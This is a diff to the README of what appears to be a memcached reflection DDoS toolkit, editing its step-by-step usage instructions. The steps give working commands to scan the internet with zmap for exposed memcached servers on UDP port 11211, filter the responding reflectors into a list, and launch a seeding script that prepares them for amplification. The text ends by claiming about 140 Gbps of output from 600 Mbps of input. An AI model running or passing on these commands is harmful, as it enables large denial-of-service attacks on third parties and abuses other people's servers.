@@ -28,15 +28,18 @@ Memcache Daemon has thankfully been patched and most old and vulnerable devices 
 
 ### How to use
 
-1. First use zmap to scan for all reflectors responding to "stats items".
+1. First use zmap to scan for all reflectors responding to "stats items":
 
     ```bash
-    echo -ne '\x00\x01\x00\x00\x00\x01\x00\x00stats items\r\n'>memecached_probe.pkt`
-
-    zmap -p11211 --output-filter='sport=11211' -Mudp --probe-args=file:memecached.pkt -f "saddr,udp_pkt_size,data" -o ~/memcached.alive.txt
+    echo -ne '\x00\x01\x00\x00\x00\x01\x00\x00stats items\r\n' > memcached_probe.pkt
     ```
 
-2. Filter list using this command (this removes bogus responses and cleans up the list).
+    ```bash
+    zmap -p11211 --output-filter='sport=11211' -Mudp --probe-args=file:memcached_probe.pkt \
+        -f "saddr,udp_pkt_size,data" -o ~/memcached.alive.txt
+    ```
+
+2. Filter list using this command (this removes bogus responses and cleans up the list):
 
     ```bash
     cat ~/memcached.alive.txt | sed 's/,/ /g' | sed 's/saddr.*//g' \
@@ -46,12 +49,13 @@ Memcache Daemon has thankfully been patched and most old and vulnerable devices 
 
 3. Download the list file `memcached.list.txt` as this will be usable by the C scripts in this folder as well.
 
-4. Run the seeding process.
+4. Run the seeding process:
 
    * This just uses a junkfile to hold output which is erased at the start if it exists, thus you can paste the entire line in over and over to seed the IPs present in the `memcached.list.txt` file!
 
     ```bash
-    rm junkfile;shuf memcached.list>shufflejunk;mv shufflejunk memcached.list;screen -dmS seeder python3 memecached-seeder.py memcached.list junkfile
+    rm junkfile;shuf memcached.list>shufflejunk;mv shufflejunk memcached.list; \
+    screen -dmS seeder python3 memecached-seeder.py memcached.list junkfile
     ```
 
-#### ~140 Gbps output with 600 Mbps input as at Q2 2020
+### ~140 Gbps output with 600 Mbps input as at Q2 2020
